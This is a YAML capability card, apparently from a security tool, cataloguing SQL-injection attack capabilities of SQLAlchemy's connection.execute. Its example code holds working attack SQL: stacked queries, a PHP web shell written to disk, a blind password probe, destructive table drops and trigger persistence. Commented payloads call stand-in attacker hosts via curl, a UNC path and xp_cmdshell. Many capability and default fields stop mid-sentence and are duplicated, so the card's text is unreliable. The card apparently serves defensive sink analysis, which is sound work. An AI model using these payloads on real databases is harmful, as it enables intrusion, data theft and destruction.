# connection.execute

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-09a55975ab65da4c
api: connection.execute
api_family: sqlalchemy.connection.execute
runtime:
  language: python
  ecosystem: python-runtime
  package: sqlalchemy
  version: legacy-source-bound
capability_class: sql-exec
normative_authority: capability-facts-only
bound_sinks:
- db.cursor.execute
- sqlalchemy.session.execute
roles:
- role_id: content
  description: Legacy controlled role content.
  bindings:
  - expression: text
    caller_bindable: true
- role_id: statement
  description: Legacy controlled role statement.
  bindings:
  - expression: statement
    caller_bindable: true
facets:
- facet_id: legacy-facet-bf4b3d4f
  capability: Execute ANY valid SQL statement that the underlying database engine accepts
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-05a4f127
  capability: Accept multi-statement strings when the underlying driver permits them
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-794045d3
  capability: Arbitrary data exfiltration from EVERY table, view, and schema reachable by
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-7882cd05
  capability: 'Read arbitrary server-side files through database-specific functions:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-2ff5a0cd
  capability: 'Write arbitrary files to the server filesystem: `SELECT ... INTO'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-51b1129f
  capability: Execute arbitrary OS commands on the database host through database-specific
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-c6ad069b
  capability: Escalate the database connection to OS-level code execution by writing a
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-da4e00b3
  capability: 'Perform Second-Order SQL Injection through database-resident mechanisms:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-724598c7
  capability: 'Create, alter, or drop database users and roles: `CREATE USER`,'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-ca283edc
  capability: 'Enable/disable database features that widen attack surface:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-676cbd9c
  capability: 'Access cross-database and cross-schema data: `SELECT * FROM'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-941be667
  capability: Perform blind data extraction through boolean-based or time-based side
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-0555db65
  capability: Use UNION-based injection to combine attacker-controlled results with benign
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-8acabb74
  capability: 'Stack queries to run independent statements in a single call:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-605bdd5c
  capability: 'Modify the database schema destructively: `DROP TABLE/DATABASE/INDEX`,'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-83e0807b
  capability: 'Leverage SQLite-specific attack surface when the backend is sqlite3:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-ac4f677b
  capability: 'Leverage PostgreSQL-specific extension points: `COPY ... PROGRAM` for'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-882b8bb9
  capability: 'Leverage MySQL/MariaDB-specific extension points: `LOAD DATA INFILE` for'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-817b7585
  capability: 'Leverage SQL Server-specific extension points (when using pyodbc/pymssql):'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-bac824ee
  capability: 'Leverage Oracle-specific extension points (when using cx_Oracle/oracledb):'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-0b3eb0b0
  capability: Exfiltrate data through out-of-band (OOB) channels, bypassing firewalls
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-891e3be4
  capability: 'Perform denial-of-service against the database: `SELECT SLEEP(9999)` or'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-6ff2a92d
  capability: 'Suppress errors to stay stealthy: wrap payloads in exception-handling SQL'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-39d99aa2
  capability: 'Enumerate database metadata to map the attack surface:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-d7227632
  capability: 'Direct `CursorResult` control: unlike `Session.execute()`, the Connection'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-81cdf122
  capability: 'Connection-level transaction control: the attacker can call'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-42e71134
  capability: 'Connection-specific pipelining: `conn.execute()` is a direct wrapper'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-158988e7
  capability: 'Connection.exec_driver_sql() escape hatch: while `connection.execute()`'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-2292132d
  capability: 'SQLAlchemy-specific parameter binding with named placeholders:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-71bb7661
  capability: 'Statement composition abuse: the attacker-controlled statement string'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-ed648cf7
  role_id: null
  value: SQLAlchemy's `text(sql_string)` passes the raw SQL string to the
  security_effect: SQLAlchemy's `text(sql_string)` passes the raw SQL string to the
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-7372ec50
  role_id: null
  value: The Connection does NOT enforce statement-type restrictions. A single
  security_effect: The Connection does NOT enforce statement-type restrictions. A single
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-f14829a3
  role_id: null
  value: Multi-statement execution is driver-dependent but the Connection itself
  security_effect: Multi-statement execution is driver-dependent but the Connection itself
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-df2bae35
  role_id: null
  value: The Connection inherits the Engine's dialect, connection pool, and
  security_effect: The Connection inherits the Engine's dialect, connection pool, and
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-462b2803
  role_id: null
  value: Unlike `Session.execute()`, the Connection does NOT have an identity map
  security_effect: Unlike `Session.execute()`, the Connection does NOT have an identity map
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-c6ab5544
  role_id: null
  value: The Connection's autocommit behavior is dialect-aware and differs from
  security_effect: The Connection's autocommit behavior is dialect-aware and differs from
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-9a5811cc
  role_id: null
  value: '`connection.execute()` is the internal call path that'
  security_effect: '`connection.execute()` is the internal call path that'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-d4f30a1a
  role_id: null
  value: The Connection caches compiled statement objects internally for
  security_effect: The Connection caches compiled statement objects internally for
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-377c552c
  role_id: null
  value: The Connection delegates to the DB-API cursor's `execute()` internally;
  security_effect: The Connection delegates to the DB-API cursor's `execute()` internally;
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-6d740443
  role_id: null
  value: SQLAlchemy's `Connection.execution_options()` can be chained with
  security_effect: SQLAlchemy's `Connection.execution_options()` can be chained with
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-76c56836
  role_id: null
  value: The Connection object can be used as a context manager (`with
  security_effect: The Connection object can be used as a context manager (`with
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: "from sqlalchemy import create_engine, text\n\nengine = create_engine(\"sqlite:///:memory:\")\nwith engine.connect() as conn:\n    # Normal parameterized execution\n    conn.execute(text(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)\"))\n    conn.execute(\n        text(\"INSERT INTO users (name) VALUES (:name)\"), {\"name\": \"Alice\"}\n    )\n    result = conn.execute(\n        text(\"SELECT * FROM users WHERE name = :name\"), {\"name\": \"Alice\"}\n    )\n    row = result.fetchone()\n    assert row.name == \"Alice\"\n    conn.commit()\n"
  capability_edge: "from sqlalchemy import create_engine, text\n\nengine = create_engine(\"sqlite:///:memory:\")\nwith engine.connect() as conn:\n    # 1) DDL — create attacker-chosen table\n    conn.execute(text(\"CREATE TABLE backdoor (cmd TEXT)\"))\n\n    # 2) DML with stacked multi-statement in a single call\n    conn.execute(text(\n        \"INSERT INTO backdoor VALUES ('malicious'); \"\n        \"SELECT * FROM backdoor\"\n    ))\n\n    # 3) ATTACH DATABASE to pivot to another SQLite file (filesystem read)\n    conn.execute(text(\"ATTACH DATABASE '/tmp/evil.db' AS evil\"))\n\n    # 4) File write via ATTACH + CREATE TABLE (SQLite-specific)\n    conn.execute(text(\"ATTACH DATABASE '/tmp/payload.db' AS pwnd\"))\n    conn.execute(text(\"CREATE TABLE pwnd.shell (data TEXT)\"))\n    conn.execute(text(\n        \"INSERT INTO pwnd.shell VALUES ('<?php system($_GET[c]);?>')\"\n    ))\n\n    # 5) Blind time-based side channel (PostgreSQL)\n    conn.execute(text(\n        \"SELECT CASE WHEN (SELECT\
    \ substr(password,1,1) FROM users LIMIT 1)='a'\"\n        \" THEN pg_sleep(5) ELSE pg_sleep(0) END\"\n    ))\n\n    # 6) Schema enumeration — discover all tables\n    result = conn.execute(\n        text(\"SELECT name, sql FROM sqlite_master WHERE type='table'\")\n    )\n    schema = result.fetchall()\n\n    # 7) Destructive: drop all user tables\n    result = conn.execute(\n        text(\"SELECT name FROM sqlite_master \"\n             \"WHERE type='table' AND name NOT LIKE 'sqlite_%'\")\n    )\n    for (name,) in result.fetchall():\n        conn.execute(text(f\"DROP TABLE IF EXISTS {name}\"))\n\n    # 8) Second-order persistence via trigger:\n    #    every future INSERT runs attacker SQL\n    conn.execute(text(\"CREATE TABLE log (entry TEXT)\"))\n    conn.execute(text(\n        \"CREATE TRIGGER trig_backdoor AFTER INSERT ON log \"\n        \"BEGIN \"\n        \"  INSERT INTO backdoor VALUES ('trigger fired on: ' || NEW.entry); \"\n        \"END\"\n    ))\n    conn.execute(text(\"\
    INSERT INTO log VALUES ('benign_input')\"))\n\n    # 9) Connection-level raw transaction control (no ORM overhead)\n    conn.execute(text(\"BEGIN\"))\n    conn.execute(text(\"INSERT INTO backdoor VALUES ('in_txn')\"))\n    conn.execute(text(\"COMMIT\"))\n\n    # 10) Stream results for bulk exfiltration without memory pressure\n    result = conn.execution_options(stream_results=True).execute(\n        text(\"SELECT * FROM sqlite_master\")\n    )\n    for row in result:\n        pass  # rows streamed incrementally\n\n    # 11) Direct dict-like result access via mappings()\n    result = conn.execute(text(\"SELECT name, sql FROM sqlite_master\"))\n    for row in result.mappings():\n        print(row[\"name\"], row[\"sql\"])\n\n    # 12) Mixed named-param and injection through text() —\n    #     the :name placeholder is a no-op when OR 1=1 short-circuits\n    conn.execute(text(\n        \"SELECT * FROM users WHERE name = :name OR 1=1 --\"\n    ), {\"name\": \"doesntmatter\"})\n\n    # 13)\
    \ PRAGMA writable_schema — bypass schema protection (SQLite)\n    conn.execute(text(\"PRAGMA writable_schema=ON\"))\n    conn.execute(text(\"DELETE FROM sqlite_master WHERE type='table'\"))\n\n    # 14) PostgreSQL COPY ... PROGRAM — OS command execution\n    # conn.execute(text(\n    #     \"COPY (SELECT '') TO PROGRAM 'curl http://attacker/?d=$(whoami)'\"\n    # ))\n\n    # 15) MySQL OOB exfiltration via UNC path (SMB callback)\n    # conn.execute(text(\n    #     \"SELECT LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\', \"\n    #     \"(SELECT password FROM users LIMIT 1), \"\n    #     \"'.attacker.com\\\\\\\\share'))\"\n    # ))\n\n    # 16) SQL Server xp_cmdshell — OS command execution\n    # conn.execute(text(\n    #     \"EXEC xp_cmdshell 'powershell -enc <base64_payload>'\"\n    # ))\n\n    # 17) Connection.exec_driver_sql() — bypass ALL SQLAlchemy compilation\n    # conn.exec_driver_sql(\"ATTACH DATABASE '/tmp/evil.db' AS evil\")\n"
provenance:
- https://docs.sqlalchemy.org/en/20/core/connections.html#sqlalchemy.engine.Connection.execute — Connection.execute API reference
- https://docs.sqlalchemy.org/en/20/core/connections.html#sqlalchemy.engine.Connection.exec_driver_sql — Connection.exec_driver_sql bypasses compilation
- https://docs.sqlalchemy.org/en/20/core/sqlelement.html#sqlalchemy.sql.expression.text — text() construct explicitly accepts raw SQL
- https://docs.sqlalchemy.org/en/20/orm/session_api.html#sqlalchemy.orm.Session.execute — Session.execute delegates to Connection.execute internally
- '{''CWE-89'': "Improper Neutralization of Special Elements used in an SQL Command (''SQL Injection'')"}'
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- https://portswigger.net/web-security/sql-injection — SQL injection techniques and cheat sheet
- https://www.sqlite.org/c3ref/exec.html — SQLite C API (underlies Python sqlite3 driver behind SQLAlchemy)
- https://www.postgresql.org/docs/current/sql-copy.html — PostgreSQL COPY (includes PROGRAM variant)
- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql — SQL Server xp_cmdshell
- https://dev.mysql.com/doc/refman/8.4/en/load-data.html — MySQL LOAD DATA INFILE (includes LOCAL variant for SSRF)
```
